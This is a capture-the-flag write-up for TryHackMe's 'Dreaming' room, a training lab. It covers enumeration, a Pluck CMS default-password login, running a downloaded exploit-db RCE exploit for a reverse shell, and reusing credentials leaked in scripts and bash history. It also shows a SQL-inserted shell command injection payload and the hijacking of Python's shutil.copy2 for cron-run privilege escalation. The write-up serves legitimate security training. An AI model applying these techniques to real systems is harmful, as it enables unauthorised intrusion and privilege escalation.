# Dreaming

A writeup for the room [Dreaming](https://tryhackme.com/room/dreaming) on TryHackMe.

> Solve the riddle that dreams have woven.

<Image src={require("./logo.png").default} width="256" />

Apart from an initial small web vulnerability, all flags require basic privilege escalation techniques and to work with Python scripts.

### What is the Lucien Flag?

We can start by scanning the machine with nmap.

```bash
nmap -sS -v MACHINE_IP
```

<Image src={require("./01-nmap.png").default} />

There are only ports 22 and 80 open, but if we try to open the browser the web server we will only find the Apache default page.

<Image src={require("./02-apache.png").default} />

We can try to enumerate subdirectories with Gobuster hoping to find something useful:

```bash
gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/big.txt
```

<Image src={require("./03-gobuster.png").default} />

If we go to /app we can see:

<Image src={require("./04-app-folder.png").default} />

<Image src={require("./05-pluck.png").default} />

Under /app, there is a Pluck instance. Pluck is a CMS like WordPress, which could pose a vulnerability.

```bash
http://MACHINE_IP/app/pluck-4.7.13
http://MACHINE_IP/app/pluck-4.7.13/login.php
```

<Image src={require("./06-pluck-login.png").default} />

The Pluck homepage includes a URL for admin login. After searching online, the default password is "password".

We can now log in and see the admin panel.

<Image src={require("./07-pluck-panel.png").default} />

Once logged in, most of Pluck's features are accessible. Upon further online research, it is possible to discover a Remote Code Execution vulnerability based on the admin's capacity to upload images.

[https://www.exploit-db.com/exploits/49909](https://www.exploit-db.com/exploits/49909)

We can download the exploit and run it with the following command:

```python
wget https://www.exploit-db.com/download/49909 -O exploit.py
python3 ./exploit.py MACHINE_IP 80 password /app/pluck-4.7.13
```

Then, if you go to the page given in the output we will find a reverse shell.

<Image src={require("./08-exploit.png").default} />

Looking inside the file system, we find two interesting files in the /opt path. One is called test.py and the other is called getDreams.py.

While the latter is a script for a database used by the user death with the password redacted, the former is a script used to log in to Pluck with Lucien's password "HeyLucien#@1999!"

<Image src={require("./09-reverse-shell.png").default} />

We can assume that it is the same password for his account and try it with ssh.

```bash
ssh lucien@MACHINE_IP
```

It works and we are finally inside the system as Lucien and we can read the first flag.

<Image src={require("./10-lucien-flag.png").default} />


### What is the Death Flag?

A possible solution for privilige escalation can be seen by checking the permissions of the user Lucien:

```bash
sudo -l
```

<Image src={require("./11-sudo-l.png").default} />

We can see that Lucien can run the script getDreams.py as the user death without a password.

For the previous script, this is stored inside the home folder of Death and it is only executable, not readable.

If we try to run it we will see the output without any credentials error. We can suppose that in this version the password has not been redacted.

```bash
sudo -u death /opt/scripts/getDreams.py
```

The code can be obtained from the folder "/opt":

```py
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                # !!! Here we can inject something
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```

If we add a new dreamer or dream with specific text we can inject shell commands and run them as the user death.

To do so, we need to connect to the database and add new records to it. After some investigation in the system, in the ".bash_history" file of Lucien, there is a MySQL command with the password in clear.

```bash
cat ~/.bash_history
```

<Image src={require("./13-bash-history.png").default} />

We can connect to the database using the same command:

```bash
mysql -u lucien -plucien42DBPASSWORD
```

Then we can move to the correct database:

```sql
show databases;
use library;

show tables;
select * from dreamers;
```

Inject a command to read the flag:

```sql
insert into dreams (dreamer, dream) VALUES ("'flag'", "''; cat ~/death_flag.txt; # ");
```

Now, if we run again the script we will see a new line with the flag printed in the output.

```bash
sudo -u death python3 /home/death/getDreams.py
```

The final command that will be executed by the script "getDreams.py" is:

```bash
echo 'flag'; cat ~/death_flag.txt;
```

In this way we have found the Death's flag.

### What is the Morpheus Flag?

First things first, we can obtain the credentials of the Death user from the script getDreams.py

<Image src={require("./14-death-password.png").default} />

Now we can change the user from Lucien to Death using the password !mementoMORI666!

We can try to look in the system for interesting files of Morpheus:

```bash
find / -type f -group morpheus 2> /dev/null
```

<Image src={require("./15-morpheus-files.png").default} />

<Image src={require("./16-morpheus-folder.png").default} />

The script restore.py is readable by all and it contains a script for the backup of the kingdom folder.

This script could be used for a cron job. We could try to inject some instructions inside the shutil library and then wait for the job to work running the commands as Morpheus.

```bash
find / -name *shutil* 2> /dev/null
ls -al /usr/lib/python3.8/shutil.py
```

<Image src={require("./17-shutil.png").default} />

The user death can edit the file by adding additional instructions in the function copy2 used by the script restore.

A possible line to add is an OS call to change the permissions of the Morpheus flag.

```python
os.system("chmod 777 /home/morpheus/morpheus_flag.txt")
```

<Image src={require("./18-copy2.png").default} />

After some time, we can check the permissions of the file and read the flag.

```bash
ls -al /home/morpheus/morpheus_flag.txt
```

<Image src={require("./19-morpheus-flag.png").default} />
